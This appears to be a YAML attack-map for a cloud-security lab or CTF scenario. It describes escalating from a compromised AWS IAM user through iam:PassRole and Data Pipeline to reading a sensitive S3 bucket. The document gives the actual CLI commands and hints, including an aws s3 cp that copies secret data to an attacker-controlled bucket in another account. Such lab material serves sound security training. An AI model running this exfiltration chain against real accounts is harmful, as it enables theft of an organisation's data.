attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-bucket-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the pipeline role and Data Pipeline
        permissions (CreatePipeline, PutPipelineDefinition, ActivatePipeline).

    - id: pipeline-role
      label: "Pipeline Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-bucket-pipeline-role"
      description: >
        This IAM role is passed to the Data Pipeline service. It has s3:GetObject and
        s3:ListBucket permissions on the sensitive data bucket, giving the pipeline EC2
        instance read access to data it should not be able to reach. The role is the
        key misconfiguration on the victim side — an attacker with iam:PassRole on it
        can run arbitrary shell commands on an EC2 instance with this role attached.

    - id: sensitive-bucket
      label: "Sensitive Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-sensitive-data-datapipeline-001-{account_id}-{suffix}"
      description: >
        This S3 bucket contains sensitive data (the target of the attack). The pipeline
        role has s3:GetObject and s3:ListBucket access via IAM policy, which means any
        EC2 instance launched with the pipeline role can read from it. The starting user
        has no direct IAM access to this bucket, but by passing the pipeline role to
        Data Pipeline they can reach it indirectly.

    - id: exfil-bucket
      label: "Exfil Bucket"
      type: resource
      subType: s3-bucket
      isAttackerControlled: true
      arn: "arn:aws:s3:::pl-exfil-bucket-datapipeline-001-{attacker_account_id}-{suffix}"
      description: >
        This S3 bucket is attacker-controlled infrastructure deployed in the attacker's
        own AWS account. The attacker stages it before the attack and configures its
        resource policy to accept writes from the victim account. The pipeline EC2
        instance (running as the pipeline role in the victim account) copies the
        sensitive data here cross-account. This bucket is NOT a victim misconfiguration
        — it is something the attacker brings to the attack.

  edges:
    - from: starting-principal
      to: pipeline-role
      label: "iam:PassRole + datapipeline:*"
      description: >
        The starting user creates a Data Pipeline, defines a ShellCommandActivity,
        passes the pipeline role to it, and activates the pipeline. An EC2 instance
        is launched running as the pipeline role.
      hints:
        - "Build the pipeline definition JSON with three objects: a Default object (role and resourceRole set to the passed role ARN), a ShellCommandActivity with the exfil command, and an Ec2Resource. Then call create-pipeline, put-pipeline-definition, and activate-pipeline in sequence."
        - "Browse to https://pathfinding.cloud/paths/datapipeline-001 for technique details."
      commands:
        - description: "Create the Data Pipeline"
          command: "aws datapipeline create-pipeline --name exfil-pipeline --unique-id exfil-pipeline-001 --query 'pipelineId' --output text"
        - description: "Define the pipeline with a shell command activity"
          command: "aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-definition file://pipeline-definition.json"
        - description: "Activate the pipeline"
          command: "aws datapipeline activate-pipeline --pipeline-id <pipeline-id>"

    - from: pipeline-role
      to: sensitive-bucket
      label: "s3:GetObject"
      description: >
        The EC2 instance launched by Data Pipeline, operating as the pipeline role,
        reads data from the sensitive S3 bucket. This is permitted by the pipeline
        role's IAM policy, which grants s3:GetObject and s3:ListBucket on the sensitive
        bucket. The shell command in the ShellCommandActivity uses the AWS CLI to copy
        the sensitive file out of the bucket.
      hints:
        - "The ShellCommandActivity runs on the EC2 instance as the pipeline role -- any AWS CLI s3 command the role is permitted to run will succeed. Use aws s3 cp to copy objects out of the sensitive bucket."
      commands:
        - description: "Copy sensitive data to attacker-controlled exfil bucket (executed inside pipeline via ShellCommandActivity)"
          command: "aws s3 cp s3://pl-sensitive-data-datapipeline-001-ACCOUNT-SUFFIX/secret-data.txt s3://pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-SUFFIX/exfiltrated.txt"
        - description: "Capture the CTF flag"
          command: "aws s3 cp s3://pl-sensitive-data-datapipeline-001-{account_id}-{suffix}/flag.txt -"

    - from: pipeline-role
      to: exfil-bucket
      label: "s3:PutObject (cross-account)"
      description: >
        The pipeline EC2 instance writes the sensitive data to the attacker-controlled
        exfil bucket in the attacker's own AWS account. The attacker staged this bucket
        before launching the attack and configured its resource policy to grant
        s3:PutObject to the victim account root, allowing any principal from the victim
        account to write to it. This is not a victim misconfiguration -- it is the
        attacker's own infrastructure receiving stolen data.
      hints:
        - "Stage your exfil bucket with a resource policy granting s3:PutObject to the victim account root (arn:aws:iam::VICTIM_ACCOUNT:root) before activating the pipeline. The pipeline EC2 instance inherits the pipeline role and will write cross-account as long as the bucket policy permits it."
      commands: []

    - from: starting-principal
      to: exfil-bucket
      label: "s3:GetObject (attacker owns bucket)"
      description: >
        After the pipeline runs, the starting user retrieves the exfiltrated data from
        the attacker-controlled exfil bucket. Because the attacker owns this bucket,
        they can use their own attacker-account credentials to read the data — no IAM
        permission on the victim account is needed for this final step.
      hints:
        - "Wait 60-90 seconds after activating the pipeline for the EC2 instance to launch and execute the shell command, then use your attacker-account credentials to read the exfiltrated file from the exfil bucket."
      commands:
        - description: "Read the exfiltrated data using attacker-account credentials"
          command: "aws s3 cp s3://pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-SUFFIX/exfiltrated.txt -"
